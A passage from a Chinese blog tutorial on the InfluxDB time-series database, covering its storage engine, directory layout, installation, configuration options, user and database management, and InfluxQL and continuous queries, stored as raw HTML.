policy：存储策略，用于设置数据保留的时间，每个数据库刚开始会自动创建一个默认的存储策略autogen，数据保留时间为永久，之后用户可以自己设置，例如保留最近2小时的数据。插入和查询数据时如果不指定存储策略，则使用默认存储策略，且默认存储策略可以修改。InfluxDB会定期清除过期的数据。</p>\r\n\r\n<p>Shard：在InfluxDB中是一个比较重要的概念，它和Retention policy相关联。每一个存储策略下会存在许多shard，每一个shard存储一个指定时间段内的数据，并且不重复，例如7点-8点的数据落入shard0中，8点-9点的数据则落入shard1中。每一个shard都对应一个底层的tsm存储引擎，有独立的 cache、wal、tsm file。</p>\r\n\r\n<p>TSM存储引擎主要由几个部分组成：cache、wal、tsm file、compactor。</p>\r\n\r\n<p><a href=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080308431219.jpg\"><img alt=\"玩转时序数据库InfluxDB\" src=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080308431219.jpg\" /></a></p>\r\n\r\n<p>Cache：相当于是LSM Tree中的memtabl。插入数据时，实际上是同时往cache与wal中写入数据，可以认为cache是wal文件中的数据在内存中的缓存。当InfluxDB启动时，会遍历所有的wal文件，重新构造cache，这样即使系统出现故障，也不会导致数据的丢失。cache中的数据并不是无限增长的，有一个maxSize参数用于控制当cache中的数据占用多少内存后就会将数据写入tsm文件。如果不配置的话，默认上限为25MB，每当cache中的数据达到阀值后，会将当前的cache进行一次快照，之后清空当前cache中的内容，再创建一个新的wal文件用于写入，剩下的wal文件最后会被删除，快照中的数据会经过排序写入一个新的tsm文件中。</p>\r\n\r\n<p>WAL：WAL文件的内容与内存中的cache相同，其作用就是为了持久化数据，当系统崩溃后可以通过wal文件恢复还没有写入到tsm文件中的数据。</p>\r\n\r\n<p>TSM File：单个tsm file大小最大为 2GB，用于存放数据。</p>\r\n\r\n<p>Compactor：Compactor组件在后台持续运行，每隔1秒会检查一次是否有需要压缩合并的数据。</p>\r\n\r\n<p>主要进行两种操作，一种是cache中的数据大小达到阀值后，进行快照，之后转存到一个新的tsm文件中。另外一种就是合并当前的tsm文件，将多个小的tsm文件合并成一个，使每一个文件尽量达到单个文件的最大大小，减少文件的数量，并且一些数据的删除操作也是在这个时候完成。</p>\r\n\r\n<h3>三、InfluxDB目录与文件</h3>\r\n\r\n<p>InfluxDB的数据存储主要有三个目录，默认情况下是meta, wal以及data三个目录。</p>\r\n\r\n<p>meta用于存储数据库的一些元数据，meta目录下有一个meta.db文件。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>/var/lib/influxdb/meta/</p>\r\n\r\n			<p>└── meta.db</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>wal目录存放预写日志文件，以.wal结尾。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n			</td>\r\n			<td>\r\n			<p>/var/lib/influxdb/wal/</p>\r\n\r\n			<p>└── test</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;└── autogen</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── 22</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── _00002.wal</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>data目录存放实际存储的数据文件，以.tsm结尾。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n			</td>\r\n			<td>\r\n			<p>/var/lib/influxdb/data/</p>\r\n\r\n			<p>└── test</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;└── autogen</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── 22</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└── 000000001-000000001.tsm</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>上面几张图中，test为数据库名，autogen为存储策略名称，再下一层目录中的以数字命名的目录是shard的ID值。</p>\r\n\r\n<p>存储策略下有一个shard，ID为22，shard存储了某一个时间段范围内的数据。再下一级的目录则为具体的文件，分别是.wal和.tsm结尾的文件。</p>\r\n\r\n<h3>四、InfluxDB安装配置</h3>\r\n\r\n<p><strong>1）安装配置</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n			</td>\r\n			<td>\r\n			<p># 安装influxdb;</p>\r\n\r\n			<p>$ yum install influxdb</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 启动influxdb;</p>\r\n\r\n			<p>$ systemctl start influxdb</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 连接influxdb;</p>\r\n\r\n			<p>$ influx -database &#39;test&#39; -host &#39;localhost&#39; -port &#39;8086&#39;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>2）相关文件</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n\r\n			<p>24</p>\r\n\r\n			<p>25</p>\r\n\r\n			<p>26</p>\r\n\r\n			<p>27</p>\r\n\r\n			<p>28</p>\r\n\r\n			<p>29</p>\r\n\r\n			<p>30</p>\r\n\r\n			<p>31</p>\r\n\r\n			<p>32</p>\r\n			</td>\r\n			<td>\r\n			<p>$ rpm -ql influxdb</p>\r\n\r\n			<p># 配置文件;</p>\r\n\r\n			<p>/etc/influxdb/influxdb.conf</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 日志轮转;</p>\r\n\r\n			<p>/etc/logrotate.d/influxdb</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 命令行客户端;</p>\r\n\r\n			<p>/usr/bin/influx</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查看工具;</p>\r\n\r\n			<p>/usr/bin/influx_inspect</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 压力测试工具;</p>\r\n\r\n			<p>/usr/bin/influx_stress</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 数据库转换工具（将数据库从b1或bz1格式转换为tsm1格式）;</p>\r\n\r\n			<p>/usr/bin/influx_tsm</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 服务端;</p>\r\n\r\n			<p>/usr/bin/influxd</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># Systemctl服务管理;</p>\r\n\r\n			<p>/usr/lib/influxdb/scripts/influxdb.service</p>\r\n\r\n			<p>/usr/lib/influxdb/scripts/init.sh</p>\r\n\r\n			<p>................</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 数据目录;</p>\r\n\r\n			<p>/var/lib/influxdb</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 日志目录;</p>\r\n\r\n			<p>/var/log/influxdb</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>3）开启Web</strong></p>\r\n\r\n<p>influxdb提供的简单web管理页面，可以用来操作influxdb，默认没有开启，如果想开启需要修改配置文件中[admin]部分，如下：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n			</td>\r\n			<td>\r\n			<p>[admin]</p>\r\n\r\n			<p>&nbsp;&nbsp;# Determines whether the admin service is enabled.</p>\r\n\r\n			<p>&nbsp;&nbsp;enabled = true</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;# The default bind address used by the admin service.</p>\r\n\r\n			<p>&nbsp;&nbsp;bind-address = &quot;:8083&quot;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>4）配置文件</strong></p>\r\n\r\n<p>[meta] &ndash; meta相关配置</p>\r\n\r\n<p>dir：meta数据存放目录，默认值：/var/lib/influxdb/meta。</p>\r\n\r\n<p>retention-autocreate：用于控制默认存储策略，数据库创建时，会自动生成autogen的存储策略，默认值：true。</p>\r\n\r\n<p>logging-enabled：是否开启meta日志，默认值：true。</p>\r\n\r\n<p>[data] &ndash; tsm1引擎配置</p>\r\n\r\n<p>dir：最终数据（TSM文件）存储目录，默认值：/var/lib/influxdb/data。</p>\r\n\r\n<p>wal-dir：预写日志存储目录，默认值：/var/lib/influxdb/wal。</p>\r\n\r\n<p>query-log-enabled：是否开启tsm引擎查询日志，默认值：true。</p>\r\n\r\n<p>cache-max-memory-size：用于限定shard最大值，大于该值时会拒绝写入，默认值：DefaultCacheMaxMemorySize = 1024 * 1024 * 1024 // 1GB。</p>\r\n\r\n<p>cache-snapshot-memory-size：用于设置快照大小，大于该值时数据会刷新到tsm文件，默认值：DefaultCacheSnapshotMemorySize = 25 * 1024 * 1024 // 25MB。</p>\r\n\r\n<p>cache-snapshot-write-cold-duration：tsm1引擎snapshot写盘延迟，默认值：DefaultCacheSnapshotWriteColdDuration = time.Duration(10 * time.Minute)。</p>\r\n\r\n<p>compact-full-write-cold-duration：tsm文件在压缩前可以存储的最大时间，默认值：DefaultCompactFullWriteColdDuration = time.Duration(4 * time.Hour)。</p>\r\n\r\n<p>max-series-per-database：限制数据库的级数，该值为0时取消限制，默认值：DefaultMaxSeriesPerDatabase = 1000000，measurement, tag set, retention policy相同的数据集合算做一个serie，级数算法示例如下：假设monitor1这个measurement有两个tags：id 和 name id 的数量为10，name的数量为 100，则 series 基数为 10 * 100 = 1000。</p>\r\n\r\n<p>max-values-per-tag：一个tag最大的value数，0取消限制，默认值：DefaultMaxValuesPerTag = 100000。</p>\r\n\r\n<p>trace-logging-enabled：是否开启trace日志，默认值：false。</p>\r\n\r\n<p>[coordinator] &ndash; 查询管理的配置选项</p>\r\n\r\n<p>write-timeout：写操作超时时间，默认值： 10s。</p>\r\n\r\n<p>max-concurrent-queries：最大并发查询数，0无限制，默认值： 0。</p>\r\n\r\n<p>query-timeout：查询操作超时时间，0无限制，默认值：0s。</p>\r\n\r\n<p>log-queries-after：慢查询超时时间，0无限制，默认值：0s。</p>\r\n\r\n<p>max-select-point = 0：SELECT语句可以处理的最大点数（points），0无限制，默认值：0。</p>\r\n\r\n<p>max-select-series = 0：SELECT语句可以处理的最大级数（series），0无限制，默认值：0。</p>\r\n\r\n<p>max-select-buckets = 0：SELECT语句可以处理的最大&rdquo;GROUP BY time()&rdquo;的时间周期，0无限制，默认值：0。</p>\r\n\r\n<p>[retention] &ndash; 旧数据的保留策略</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ：true。</p>\r\n\r\n<p>check-interval：检查时间间隔，默认值 ：&rdquo;30m0s&rdquo;。</p>\r\n\r\n<p>[shard-precreation] &ndash; 分区预创建</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ： true。</p>\r\n\r\n<p>check-interval：检查时间间隔，默认值 ：&rdquo;10m0s&rdquo;。</p>\r\n\r\n<p>advance-period：预创建分区的最大提前时间，默认值 ：&rdquo;30m0s&rdquo;。</p>\r\n\r\n<p>[admin] &ndash; influxdb提供的简单web管理页面</p>\r\n\r\n<p>enabled：是否启用该模块，默认值：false。</p>\r\n\r\n<p>bind-address：绑定地址，默认值：&rdquo;:8083&Prime;。</p>\r\n\r\n<p>https-enabled：是否开启https ，默认值：false。</p>\r\n\r\n<p>https-certificate：https证书路径，默认值：&rdquo;/etc/ssl/influxdb.pem&rdquo;。</p>\r\n\r\n<p>[monitor] &ndash; 这一部分控制InfluxDB自有的监控系统。 默认情况下，InfluxDB把这些数据写入_internal数据库，如果这个库不存在则自动创建。 _internal 库默认的retention策略是7天，如果你想使用一个自己的retention策略，需要自己创建。</p>\r\n\r\n<p>store-enabled：是否启用该模块，默认值 ：true。</p>\r\n\r\n<p>store-database：默认数据库：&rdquo;_internal&rdquo;。</p>\r\n\r\n<p>store-interval：统计间隔，默认值：&rdquo;10s&rdquo;。</p>\r\n\r\n<p>[subscriber] &ndash; 控制Kapacitor接受数据的配置</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ：true。</p>\r\n\r\n<p>http-timeout：http超时时间，默认值：&rdquo;30s&rdquo;。</p>\r\n\r\n<p>insecure-skip-verify：是否允许不安全的证书，当测试自己签发的证书时比较有用。默认值：false。</p>\r\n\r\n<p>ca-certs：设置CA证书，无默认值。</p>\r\n\r\n<p>write-concurrency：设置并发数目，默认值：40。</p>\r\n\r\n<p>write-buffer-size：设置buffer大小，默认值：1000。</p>\r\n\r\n<p>[http] &ndash; influxdb的http接口配置</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ：true。</p>\r\n\r\n<p>bind-address：绑定地址，默认值：&rdquo;:8086&Prime;。</p>\r\n\r\n<p>auth-enabled：是否开启认证，默认值：false。</p>\r\n\r\n<p>log-enabled：是否开启日志，默认值：true。</p>\r\n\r\n<p>write-tracing：是否开启写操作日志，如果置成true，每一次写操作都会打日志，默认值：false。</p>\r\n\r\n<p>pprof-enabled：是否开启pprof，默认值：true。</p>\r\n\r\n<p>https-enabled：是否开启https，默认值：false。</p>\r\n\r\n<p>https-certificate：设置https证书路径，默认值：&rdquo;/etc/ssl/influxdb.pem&rdquo;。</p>\r\n\r\n<p>https-private-key：设置https私钥，无默认值。</p>\r\n\r\n<p>max-row-limit：配置查询返回最大行数，默认值：10000。</p>\r\n\r\n<p>max-connection-limit：配置最大连接数，0无限制，默认值：0。</p>\r\n\r\n<p>shared-secret：用于JWT签名的共享密钥，无默认值。</p>\r\n\r\n<p>realm：配置JWT realm，默认值: &ldquo;InfluxDB&rdquo;。</p>\r\n\r\n<p>unix-socket-enabled：是否使用unix-socket，默认值：false。</p>\r\n\r\n<p>bind-socket：unix-socket路径，默认值：&rdquo;/var/run/influxdb.sock&rdquo;。</p>\r\n\r\n<p>[[graphite]] &ndash; graphite相关配置，具体参考：https://github.com/influxdata/influxdb/blob/master/services/graphite/README.md</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ：false。</p>\r\n\r\n<p>bind-address：绑定地址，默认值：&rdquo;:2003&Prime;。</p>\r\n\r\n<p>database：数据库名称，默认值：&rdquo;graphite&rdquo;。</p>\r\n\r\n<p>retention-policy：存储策略，无默认值。</p>\r\n\r\n<p>protocol：协议，默认值：&rdquo;tcp&rdquo;。</p>\r\n\r\n<p>batch-size：批量size，默认值：5000。</p>\r\n\r\n<p>batch-pending：配置在内存中等待的batch数，默认值：10。</p>\r\n\r\n<p>batch-timeout：超时时间，默认值：&rdquo;1s&rdquo;。</p>\r\n\r\n<p>consistency-level：一致性级别，默认值：&rdquo;one&rdquo;。</p>\r\n\r\n<p>separator：多个measurement间的连接符，默认值： &ldquo;.&rdquo;。</p>\r\n\r\n<p>udp-read-buffer = 0：udp读取buffer的大小，0表示使用操作系统提供的值，如果超过操作系统的默认配置则会出错。 该配置的默认值：0。</p>\r\n\r\n<p>[[collectd]] &ndash; collectd相关配置，具体参考：https://github.com/influxdata/influxdb/tree/master/services/collectd</p>\r\n\r\n<p>enabled：是否启用该模块，默认值 ：false。</p>\r\n\r\n<p>bind-address：绑定地址，默认值： &ldquo;:25826&Prime;。</p>\r\n\r\n<p>database：数据库名称，默认值：&rdquo;collectd&rdquo;。</p>\r\n\r\n<p>retention-policy = &ldquo;&rdquo;：存储策略，无默认值。</p>\r\n\r\n<p>batch-size：默认值：5000。</p>\r\n\r\n<p>batch-pending：默认值：10。</p>\r\n\r\n<p>batch-timeout：默认值：&rdquo;10s&rdquo;。</p>\r\n\r\n<p>read-buffer：udp读取buffer的大小，0表示使用操作系统提供的值，如果超过操作系统的默认配置则会出错。默认值：0。</p>\r\n\r\n<p>typesdb：路径，默认值：&rdquo;/usr/share/collectd/types.db&rdquo;。</p>\r\n\r\n<p>[[opentsdb]] &ndash; opentsdb配置</p>\r\n\r\n<p>enabled：是否启用该模块，默认值：false。</p>\r\n\r\n<p>bind-address：绑定地址，默认值：&rdquo;:4242&Prime;。</p>\r\n\r\n<p>database：默认数据库：&rdquo;opentsdb&rdquo;。</p>\r\n\r\n<p>retention-policy：存储策略，无默认值。</p>\r\n\r\n<p>consistency-level：一致性级别，默认值：&rdquo;one&rdquo;。</p>\r\n\r\n<p>tls-enabled = false：是否开启tls，默认值：false。</p>\r\n\r\n<p>certificate：证书路径，默认值：&rdquo;/etc/ssl/influxdb.pem&rdquo;。</p>\r\n\r\n<p>batch-size：默认值：1000。</p>\r\n\r\n<p>batch-pending：默认值：5。</p>\r\n\r\n<p>batch-timeout：超时时间，默认值：&rdquo;1s&rdquo;。</p>\r\n\r\n<p>log-point-errors：出错时是否记录日志，默认值：true。</p>\r\n\r\n<p>[[udp]] &ndash; udp配置</p>\r\n\r\n<p>enabled：是否启用该模块，默认值：false。</p>\r\n\r\n<p>bind-address：绑定地址，默认值：&rdquo;:8089&Prime;。</p>\r\n\r\n<p>database：数据库名称，默认值：&rdquo;udp&rdquo;。</p>\r\n\r\n<p>retention-policy：存储策略，无默认值。</p>\r\n\r\n<p>batch-size：默认值：5000。</p>\r\n\r\n<p>batch-pending：默认值：10。</p>\r\n\r\n<p>read-buffer：udp读取buffer的大小，0表示使用操作系统提供的值，如果超过操作系统的默认配置则会出错。 该配置的默认值：0。</p>\r\n\r\n<p>batch-timeout：超时时间，默认值：&rdquo;1s&rdquo;。</p>\r\n\r\n<p>precision：时间精度，无默认值。</p>\r\n\r\n<p>[continuous_queries]</p>\r\n\r\n<p>log-enabled：是否开启日志，默认值：true。</p>\r\n\r\n<p>enabled：是否开启CQs，默认值：true。</p>\r\n\r\n<p>run-interval：时间间隔，默认值：&rdquo;1s&rdquo;。</p>\r\n\r\n<h3>五、InfluxDB基本操作</h3>\r\n\r\n<p><strong>1）用户管理</strong></p>\r\n\r\n<p>可以直接在web管理页面做操作，也可以命令行。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n			</td>\r\n			<td>\r\n			<p># 显示用户;</p>\r\n\r\n			<p>show users&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 创建用户;</p>\r\n\r\n			<p>create user &quot;username&quot; with password &#39;password&#39;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 创建管理员权限用户;</p>\r\n\r\n			<p>create user &quot;username&quot; with password &#39;password&#39; with all privileges&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 删除用户;</p>\r\n\r\n			<p>drop user &quot;username&quot;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>3）数据库与表的操作</strong></p>\r\n\r\n<p>可以直接在web管理页面做操作，当然也可以命令行。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n			</td>\r\n			<td>\r\n			<p># 创建数据库;</p>\r\n\r\n			<p>create database &quot;db_name&quot;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 显示所有的数据库;</p>\r\n\r\n			<p>show databases&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 删除数据库;</p>\r\n\r\n			<p>drop database &quot;db_name&quot;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 使用数据库;</p>\r\n\r\n			<p>use db_name&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 显示该数据库中所有的表;</p>\r\n\r\n			<p>show measurements&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 创建表,直接在插入数据的时候指定表名(key-value);</p>\r\n\r\n			<p>insert disk,hostname=server02,device=/data free=90,used=110,used_percent=98.33,count=1</p>\r\n\r\n			<p>&nbsp;&nbsp;</p>\r\n\r\n			<p># 删除表;</p>\r\n\r\n			<p>drop measurement &quot;measurement_name&quot;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>4）普通查询</strong></p>\r\n\r\n<p>那么话说，InfluxDB的查询语法是很给力的，很像SQL语句。下面一一介绍下，常用的InfluxDB里面常用的SQL语句。 话说InfluxDB给与的搜索条件还是很丰富的，有时间分析下他落地在leveldb的数据结构。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n\r\n			<p>24</p>\r\n\r\n			<p>25</p>\r\n\r\n			<p>26</p>\r\n			</td>\r\n			<td>\r\n			<p># 表名都可以正则;</p>\r\n\r\n			<p>select * from /.*/ limit 1</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 输出Json格式;</p>\r\n\r\n			<p>$ influx -database &#39;test&#39; -execute &#39;select * from disk&#39; -format &#39;json&#39; -pretty</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查询数据大于200的;</p>\r\n\r\n			<p>select * from disk where free &gt; 80</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查询数据里面含有下面字符串的;</p>\r\n\r\n			<p>select * from user_events where url_base = &lsquo;friends#show&rsquo;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 约等于;</p>\r\n\r\n			<p>select line from log_lines where line =~ /paul@influx.com/</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 按照30m分钟进行聚合，时间范围是大于昨天的主机名是server1的;</p>\r\n\r\n			<p>select mean(value) from cpu_idle group by time(30m) where time &gt; now() &ndash; 1d and hostName = &#39;server1&#39;</p>\r\n\r\n			<p>select column_one&nbsp;&nbsp;from foo&nbsp;&nbsp;where time &gt; now() &ndash; 1h limit 1000;</p>\r\n\r\n			<p>select reqtime, url from web9999.httpd where reqtime &gt; 2.5;</p>\r\n\r\n			<p>select reqtime, url from web9999.httpd where time &gt; now() &ndash; 1h limit 1000;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># url搜索里面含有login的字眼，还以login开头;</p>\r\n\r\n			<p>select reqtime, url from web9999.httpd where url =~ /^\\/login\\//;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 数据的merge;</p>\r\n\r\n			<p>select reqtime, url from web9999.httpd merge web0001.httpd;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>下面再说下数据的汇聚，聚合啥的。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n			</td>\r\n			<td>\r\n			<p># count();</p>\r\n\r\n			<p>SELECT COUNT(column_name) FROM series_name group by time(10m) &hellip;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># min();</p>\r\n\r\n			<p>SELECT MIN(column_name) FROM series_name group by time(10m) &hellip;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># MAX();</p>\r\n\r\n			<p>SELECT MAX(column_name) FROM series_name group by time(10m) &hellip;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># mean();</p>\r\n\r\n			<p>SELECT MEAN(column_name) FROM series_name group by time(10m) &hellip;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>5）连续查询（Continuous Queries）</strong></p>\r\n\r\n<p>InfluxDB的连续查询是在数据库中自动定时启动的一组语句，语句中必须包含SELECT关键词和GROUP BY time()关键词。</p>\r\n\r\n<p>InfluxDB会将查询结果放在指定的数据表中。目的：使用连续查询是最优的降低采样率的方式，连续查询和存储策略搭配使用将会大大降低InfluxDB的系统占用量。而且使用连续查询后，数据会存放到指定的数据表中，这样就为以后统计不同精度的数据提供了方便。</p>\r\n\r\n<p>新建连续查询</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n			</td>\r\n			<td>\r\n			<p>CREATE CONTINUOUS QUERY &lt;cq_name&gt; ON &lt;database_name&gt;</p>\r\n\r\n			<p>[RESAMPLE [EVERY &lt;interval&gt;] [FOR &lt;interval&gt;]]</p>\r\n\r\n			<p>BEGIN SELECT &lt;function&gt;(&lt;stuff&gt;)[,&lt;function&gt;(&lt;stuff&gt;)] INTO &lt;different_measurement&gt;</p>\r\n\r\n			<p>FROM &lt;current_measurement&gt; [WHERE &lt;stuff&gt;] GROUP BY time(&lt;interval&gt;)[,&lt;stuff&gt;]</p>\r\n\r\n			<p>END</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>样例：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n			</td>\r\n			<td>\r\n			<p>CREATE CONTINUOUS QUERY redis_30m ON test BEGIN</p>\r\n\r\n			<p>SELECT mean(connected_clients), MEDIAN(connected_clients), MAX(connected_clients), MIN(connected_clients)</p>\r\n\r\n			<p>INTO redis_clients_30m FROM redis_clients GROUP BY ip,port,time(30m) END</p>\r\n			</td>\r\n		</tr>\r\n	